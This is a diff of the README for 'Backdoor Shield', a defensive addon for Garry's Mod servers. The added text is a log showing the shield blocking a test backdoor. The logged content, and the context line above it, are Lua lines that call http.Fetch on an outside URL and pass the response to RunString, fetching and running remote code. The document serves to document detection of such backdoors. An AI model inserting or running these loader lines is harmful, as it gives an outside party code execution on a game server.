@@ -100,7 +100,31 @@ http.Fetch("https://steamcommunity.omega-project.cz/lua_run/RunString.php?apikey
 
 - The first backdoor is dead, since the link inside the content doesn't work
 
-<img src="https://i.imgur.com/o6itfE2.png"/>
+<img src="https://i.imgur.com/PUX4QG3.png"/>
+
+```
+[ALERT]
+-----------------------------------------------------------------------------------
+
+[Backdoor Shield] Execution blocked!
+    Function: RunString
+    Date: 08-29-2020
+    Time: 19h 34m 56s
+    Log: data/backdoor-shield/08-29-2020/log_blocked.txt
+    Content Log: data/backdoor-shield/08-29-2020/RunString/log_blocked_(19h 34m 56s).txt
+    Detected:
+        RunString
+        http.Fetch
+    Location: stack traceback:
+	addons/backdoor-shield/lua/bs/server/modules/detouring/functions.lua:50: in function 'RunString'
+	addons/fakedoor/lua/autorun/server/sv_test2.lua:3: in main chunk
+
+
+[CONTENT]
+-----------------------------------------------------------------------------------
+
+http.Fetch("http://buriedselfesteem.com/rekt/rekt.lua", function(c) RunString(c) end )
+```
 
 - But the second one is doing some stuff
 
